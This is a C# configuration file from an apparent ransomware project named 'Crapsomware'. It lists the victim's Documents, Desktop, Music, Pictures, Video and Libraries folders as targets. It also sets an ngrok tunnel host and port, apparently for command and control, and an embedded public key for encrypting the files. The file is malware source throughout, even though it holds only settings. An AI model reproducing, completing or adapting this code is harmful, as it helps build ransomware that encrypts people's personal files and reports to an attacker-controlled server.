using System;
using System.IO;
using Microsoft.Win32;

namespace Crapsomware;

public static class Settings
{
	public static string[] paths = new string[6]
	{
		(string)Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders", "Personal", ""),
		(string)Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders", "Desktop", ""),
		(string)Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders", "My Music", ""),
		(string)Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders", "My Pictures", ""),
		(string)Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders", "My Video", ""),
		Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft\\Windows\\Libraries")
	};

	public static string host = "0.tcp.ngrok.io";

	public static int port = 11175;

	public static string publickey = "tiW3HWZv7FArtuULMz7CqwrBriKdSeTwoRc+azT//+UIKkzMf/GEuEX6kpBUAPmB7OsUxK1UjbMjS7159C3uuhbzKERJgUyGoIHSZSUBYZ7ZrrzJp81zJEDEqUeEuTgAelXb1uMVkMTKY4ePLDrCCQAjDlDPv+MWjJHuhnmNTCE=";
}
